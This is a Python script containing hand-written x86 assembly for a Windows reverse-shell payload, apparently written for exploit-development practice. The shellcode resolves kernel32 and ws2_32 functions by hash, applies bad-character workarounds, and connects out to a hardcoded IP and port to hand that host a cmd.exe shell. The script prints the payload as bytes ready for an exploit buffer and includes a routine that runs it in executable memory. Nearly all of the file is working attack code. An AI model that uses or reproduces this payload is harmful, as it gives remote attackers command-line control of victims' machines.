#!/usr/bin/python

import struct
import keystone
import ctypes

# 1. PEB Crawl to "kernel32.dll"
# 2. Resolve addresses of kernel32 functions
# 3. LoadLibrary on ws2_32
# 4. Resolve addresses of ws2_32 functions
# 5. Call WSAStartup -> WSASocketA -> WSAConnect (specify port and address)
# 6. Call CreateProcess using Socket as in, out, err
# 7. Call TerminateProcess
 
### assembly reverse shell ###
EX_ASSEMBLY = (
        "start:                  " #
        "   int3                ;" # DEBUGGING PURPOSES: Interrupt exec to attach debugger
        "   jmp main_hop        ;" # Bad char workaround
        # "   jmp main            ;" # jump down to main function

        "find_kernel32:          " # find the kernel32 module from PEB LDR
        "   xor ecx, ecx        ;" # zero out ecx
        "   mov esi,fs:[ecx+30h];" # PEB address (0x30 into the TEB)
        "   mov eax, esi        ;" # Bad char workaround
        "   sub eax, 0xfffffff4 ;" # Bad char workaround
        "   mov esi, [eax]      ;" # Bad char workaround
        # "   mov esi,[esi+0Ch]   ;" # Ldr address from PEB (0xC into PEB)
        "   mov esi, [esi+1Ch]  ;" # InItOrder head node from Ldr (0x1C into PEB_LDR_DATA)
        "next_module:            " #
        "   mov ebx, [esi+8h]   ;" # module base address of the node
        "   mov eax, esi        ;" # Bad char workaround
        "   sub eax, 0xffffffe0 ;" # Bad char workaround
        "   mov edi, [eax]      ;" # Bad char workaround
        # "   mov edi, [esi+20h]  ;" # module name
        "   mov esi, [esi]      ;" # flink entry
        "   cmp [edi+12*2], cx  ;" # check for null byte at word 12 (byte 24) of module name 
                                   # (terminating word for KERNEL32.DLL in unicode)
        "   jne next_module     ;" # move on to next module if no match
        "   ret                 ;" #

        "main_hop:               " # Bad char workaround
        "   jmp main            ;" # Bad char workaround
        
        "find_func:              " #
        "   pushad              ;" # store registers
        "   mov eax, [ebx+0x3c] ;" # offset to PE Header start
        "   mov edi, [ebx+eax+0x78];" # offset (RVA) to EAT (Export Address Table)
        "   add edi, ebx        ;" # address (VMA) of EAT 
        "   mov ecx, [edi+0x18] ;" # NumberOfNames
        "   mov edx, edi        ;" # Bad char workaround
        "   sub edx, 0xffffffe0 ;" # Bad char workaround
        "   mov eax, [edx]      ;" # Bad char workaround
        # "   mov eax, [edi+0x20] ;" # AddressOfNames offset
        "   add eax, ebx        ;" # AddressOfNames start address
        "   mov [ebp-4], eax    ;" # save AddressOfNames to stack
        "find_func_loop:         " #
        "   jecxz find_func_done;" # if ECX 0, jump out of loop
        "   dec ecx             ;" # dec NumberOfNames counter
        "   mov eax, [ebp-4]    ;" # retrieve AddressOfNames start address
        "   mov esi, [eax+ecx*4];" # AddressOfNames[NumOfNames_counter] offset
        "   add esi, ebx        ;" # AddressOfNames[x] address
        "hash_prep:             ;" #
        "   xor eax, eax        ;" # zero out eax
        "   cdq                 ;" # zero out edx (convert dword to qword)
        "   cld                 ;" # clear direction flag, string parse direction
        "hash_loop:             ;" #
        "   lodsb               ;" # load next byte from esi into al
        "   test al, al         ;" # check for null terminator byte
        "   jz hash_compare     ;" # exit if null
        "   nop                 ;" # Bad char workaround
        "   nop                 ;" # Bad char workaround
        "   nop                 ;" # Bad char workaround
        "   nop                 ;" # Bad char workaround
        "   ror edx, 0x07       ;" # Bad char workaround
        "   ror edx, 0x06       ;" # Bad char workaround
        # "   ror edx, 0x0d       ;" # rotate edx (working hash) 13 bits right
        "   add edx, eax        ;" # add string byte to hash
        "   jmp hash_loop       ;" # loop   
        "hash_compare:           " #
        "   cmp edx, [esp+0x24] ;" # compare computed hash to pushed hash
        "   jnz find_func_loop  ;" # if not equal, go to next func
        "find_func_base:         " # 
        "   mov edx, [edi+0x24] ;" # AddressOfNameOrdinals offset
        "   add edx, ebx        ;" # AddressOfNameOrdinals start address
        "   mov ax, [edx+2*ecx] ;" # Bad char workaround
        "   mov cx, ax          ;" # Bad char workaround
        # "   mov cx, [edx+2*ecx] ;" # ordinal = AddressOfNameOrdinals[NumOfNames_counter]
        "   mov edx, [edi+0x1c] ;" # AddressOfFunctions offset
        "   add edx, ebx        ;" # AddressOfFunctions start address
        "   mov eax, [edx+4*ecx];" # AddressOfFunctions[ordinal] = function offset
        "   add eax, ebx        ;" # function address 
        "   mov [esp+0x1c], eax ;" # mov function address into stored stack value of eax (for popad)
        "find_func_done:         "
        "   popad               ;" # restore registers
        "   ret                 ;" #


        "main:                  ;" # upward calls to find funcs (avoids null bytes), then make func calls
        "   mov ebp, esp        ;" # function prologue
        "   add esp, 0xffffff60 ;" # grow stack -0xa0. [esp-0x00 : esp-0x0a] = shellcode variable space
        "kernel32_funcs:         " #
        "   call find_kernel32  ;" # find kernel32.dll base address
        "   push 0xec0e4e8e     ;" # LoadLibraryA hash
        "   call find_func      ;" # find LoadLibraryA
        "   mov [ebp-0x10], eax ;" # save LoadLibraryA address
        "   push 0x16b3fe72     ;" # CreateProcessA hash
        "   call find_func      ;" # find CreateProcessA
        "   mov [ebp-0x14], eax ;" # save CreateProcessA address
        "   push 0x78b5b983     ;" # TerminateProcess hash
        "   call find_func      ;" # find TerminateProcess
        "   mov [ebp-0x18], eax ;" # save TerminateProcess address 
        "load_ws2:               " #
        "   xor eax, eax        ;" # 
        "   mov ax, 0x6c6c      ;" # "ll" 
        "   push eax            ;" # "ll\x00\x00"
        "   push 0x642e3233     ;" # "32.d"
        "   push 0x5f327377     ;" # "ws2_"
        "   push esp            ;" # pointer to "ws2_32.dll"
        "   call dword ptr [ebp-0x10];" # call LoadLibraryA on "ws2_32.dll"
        "   mov ebx, eax        ;" # store ws2_32.dll address
        "ws2_funcs:              " #
        "   push 0x3bfcedcb     ;" # WSAStartup hash
        "   call find_func      ;" # find WSAStartup
        "   mov [ebp-0x1c], eax ;" # save WSAStartup address
        "   xor eax, eax        ;" # Bad char workaround
        "   add eax, 0xadf501d8 ;" # Bad char workaround
        "   add ax, 0x0801      ;" # Bad char workaround
        "   push eax            ;" # Bad char workaround
        # "   push 0xadf509d9     ;" # WSASocketA hash
        "   call find_func      ;" # find WSASocketA 
        "   mov [ebp-0x24], eax ;" # save WSASocketA address 
        "   xor eax, eax        ;" # Bad char workaround
        "   add eax, 0xb32dba06 ;" # Bad char workaround
        "   add al, 0x06        ;" # Bad char workaround
        "   push eax            ;" # Bad char workaround
        # "   push 0xb32dba0c     ;" # WSAConnect hash
        "   call find_func      ;" # find WSAConnect 
        "   mov [ebp-0x28], eax ;" # save WSAConnect address 
        "call_wsastartup:        " #
        "   mov eax, ebp        ;" #  
        "   xor ecx, ecx        ;" #
        "   mov cl, 0x9c        ;" #
        "   sub eax, ecx        ;" # ebp-0x9c
        "   push eax            ;" # lpWSAData [out] = ebp-0x9c
        "   xor eax, eax        ;" #
        "   mov ax, 0x0202      ;" # 
        "   push eax            ;" # wVersionRequired = 2.2 (0202)
        "   call [ebp-0x1c]     ;" # call WSAStartup
        "call_wsasocketa:        " # 
        "   xor eax, eax        ;" #
        "   push eax            ;" # dwflags = 0
        "   push eax            ;" # g "GROUP" = 0
        "   push eax            ;" # lpProtocolInfo = 0
        "   mov al, 0x06        ;" # 
        "   push eax            ;" # protocol = IPPROTO_TCP (6)
        "   sub al, 0x05        ;" # 
        "   push eax            ;" # type = SOCKET_STREAM (1)
        "   inc eax             ;" # 
        "   push eax            ;" # af = AF_INET (2)
        "   call [ebp-0x24]     ;" # call WSASocket
        "   mov esi, eax        ;" # store returned socket descriptor
        "call_wsaconnect:        " #
        "   xor eax, eax        ;" #
        "   push eax            ;" # sin_zero[0-3] = 0000
        "   push eax            ;" # sin_zero[4-7] = 0000
        "   push 0xe72da8c0     ;" # in_addr = 192.168.XX.YY        ********* EDIT HERE ********* 
        "   mov ax, 0x451f      ;" # 8005                           ********* EDIT HERE ********* 
        "   shl eax, 0x10       ;" # shift port to high word
        "   add al, 0x02        ;" #
        "   push eax            ;" # sin_port = 8005 | sin_family = AF_INET (2)
        "   mov edi, esp        ;" # store sockaddr_in address
        "   xor eax, eax        ;" # 
        "   push eax            ;" # lpGQOS = 0
        "   push eax            ;" # lpSQOS = 0 
        "   push eax            ;" # lpCalleeData = 0
        "   push eax            ;" # lpCallerData = 0
        "   add al, 0x10        ;" #
        "   push eax            ;" # namelen = 0x10 (byte len of sockaddr struct) 
        "   push edi            ;" # *name = sockaddr_in address
        "   push esi            ;" # s "SOCKET" = socket handle
        "   call [ebp-0x28]     ;" # call WSAConnect 
        "cpa_startupinfoa:       " #
        "   push esi            ;" # hStdError = socket handle
        "   push esi            ;" # hStdOutput = socket handle
        "   push esi            ;" # hStdInput = socket handle
        "   xor eax, eax        ;" # 
        "   push eax            ;" # lpReserved2 = 0
        "   push eax            ;" # cbReserved2 & wShowWindow = 0
        "   add ax, 0x0101      ;" # 
        "   dec eax             ;" # 
        "   push eax            ;" # dwFlags = STARTF_USESTDHANDLES (0x100)
        "   xor eax, eax        ;" #
        "   push eax            ;" # dwFillAttribute = 0
        "   push eax            ;" # dwYCountChars = 0
        "   push eax            ;" # dwXCountChars = 0
        "   push eax            ;" # dYSize  = 0
        "   push eax            ;" # dXSize = 0
        "   push eax            ;" # dwY = 0
        "   push eax            ;" # dwX = 0
        "   push eax            ;" # lpTitle = 0
        "   push eax            ;" # lpDesktop = 0
        "   push eax            ;" # lpReserved = 0
        "   mov al, 0x44        ;" # 
        "   push eax            ;" # cb = 0x44 (size of STARTUPINFOA struct)
        "   mov edi, esp        ;" # save STARTUPINFOA address
        "cpa_create_cmd_str:     " # 
        "   mov eax, 0xff9a879b ;" #
        "   neg eax             ;" #
        "   push eax            ;" # "exe\x00"
        "   push 0x2e646d63     ;" # cmd."
        "   mov ebx, esp        ;" # store "cmd.exe" string address
        "call_createprocessa:    " # 
        "   mov eax, ebp        ;" #
        "   xor ecx, ecx        ;" #
        "   mov cl, 0x50        ;" #
        "   sub eax, ecx        ;" # ebp-0x50
        "   push eax            ;" # lpProcessInformation [out] = ebp-0x50
        "   push edi            ;" # lpStartupInfo = STARTUPINFOA struct address
        "   xor eax, eax        ;" # 
        "   push eax            ;" # lpCurrentDirectory = 0
        "   push eax            ;" # lpEnvironment = 0
        "   push eax            ;" # dwCreationFlags = 0
        "   inc eax             ;" # 
        "   push eax            ;" # bInheritHandles = TRUE (1)
        "   dec eax             ;" # 
        "   push eax            ;" # lpThreadAttributes = 0
        "   push eax            ;" # lpProcessAttributes = 0
        "   push ebx            ;" # lpCommandLine = "cmd.exe" string address
        "   push eax            ;" # lpApplicationName = 0
        "   call [ebp-0x14]     ;" # call CreateProcessA
        "call_terminateprocess:  " # 
        "   xor ecx, ecx        ;" # 
        "   push ecx            ;" # uExitCode = 0
        "   push 0xffffffff     ;" # hProcess = self (-1)
        "   call [ebp-0x18]     ;" # call TerminateProcess
        "   nop                 ;" # END. This should never execute
        )
 

def main():
    ### comment out if not deploying to a Windows machine for testing ###
    shellcode = shellcode_bytestring(EX_ASSEMBLY)
    shellcode_var(EX_ASSEMBLY)
    test_on_windows32(shellcode)


# prints shellcode as a variable to be inserted into a python script
def shellcode_var(assembly_shellcode):
    ### generate shellcode keystone engine ###
    # init engine in x86-32bit mode
    ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
    encoding, count = ks.asm(assembly_shellcode)
    sh = b""

    for i in range(len(encoding)):
        if i % 16 == 0:
            if i > 0:
                print("\"")
            print("shellcode += b\"", end='')
        print('\\x' + str(hex(encoding[i]))[2:].zfill(2), end='') # print in format "\x0a"
        sh += struct.pack("B", encoding[i]) # pack a raw struct, read encoding items as unsigned chars (B)
    
    print("\"")
    shellcode = bytearray(sh)
    print(f"\n[+] Encoded {count} instructions into {len(shellcode)} bytes")
    

# returns a big endian bytestring for appending to an exploit buffer
def shellcode_bytestring(assembly_shellcode):
    ### generate shellcode keystone engine ###
    # init engine in x86-32bit mode
    ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
    encoding, count = ks.asm(assembly_shellcode)
    shellcode = b""

    for i in range(len(encoding)):
        shellcode += struct.pack("B", encoding[i]) # pack a raw struct, read encoding items as unsigned chars (B)

    shellcode = bytearray(shellcode)
    print(f"\n[+] Encoded {count} instructions into {len(shellcode)} bytes")
    return shellcode


def test_on_windows32(shellcode):
    ### makes the shellcode executable ###
    # allocate mem page with PAGE_EXEC_READWRITE perms, returns a pointer
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(shellcode)),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))
    # tbh not sure here, but makes a ctype compatible buffer space from the shellcode
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    # move the buffer into the memory page
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         buf,
                                         ctypes.c_int(len(shellcode)))
    
    
    ### executes the shellcode ###
    print("[+] Shellcode located at address %s" % hex(ptr))
    choice = input("...PRESS ENTER TO EXECUTE SHELLCODE...")
    
    # creates the thread environment for the shellcode to run
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))
    
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


if __name__ == "__main__":
    main()
